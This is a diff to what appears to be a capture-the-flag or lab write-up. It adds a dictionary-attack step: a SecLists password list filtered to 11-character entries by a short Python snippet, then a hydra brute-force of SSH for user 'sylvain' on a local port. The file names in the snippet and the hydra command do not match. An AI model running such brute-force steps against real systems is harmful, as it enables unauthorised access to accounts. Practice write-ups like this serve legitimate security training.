@@ -14,7 +14,20 @@ foo@bar:~$ ./alx
 open the dump in wireshark
 found a line with pass in it and extract it and used a base64 decoder to get the password
 
-[ ] Dictionary attack
+[x] Dictionary attack
+[source dictionary] (https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords.txt)
+reduced by using hint given to smaller dictionary
+```python
+out = open("xato-11char.txt","w")
+with open("xato-net-10-million-passwords.txt") as f:
+	for line in f.readlines():
+		if len(line.strip())==11:
+			out.write(line)
+out.close()
+```
+
+the used that with hydra
+
 ```console
 foo@bar:~$ hydra -l sylvain -P xato-110char ssh://127.0.0.1 -s 2222
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
